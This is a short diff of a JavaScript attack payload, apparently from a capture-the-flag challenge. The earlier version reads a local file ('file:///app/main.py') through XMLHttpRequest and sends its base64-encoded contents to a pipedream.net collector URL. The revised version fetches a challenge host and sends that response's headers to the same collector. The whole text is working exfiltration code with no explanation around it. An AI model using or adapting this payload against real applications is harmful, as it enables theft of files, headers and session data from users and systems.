@@ -1,8 +1,8 @@
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "file:///app/main.py");
+xhr.open("GET", "http://catweb.zajebistyc.tf/");
 xhr.onreadystatechange = function() {
     text = xhr.responseText;
     console.log(xhr.getAllResponseHeaders());
-    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' +btoa(text));
+    fetch('https://encnu1395lyv7.x.pipedream.net/?q='+xhr.getAllResponseHeaders());
 };
 xhr.send(null);
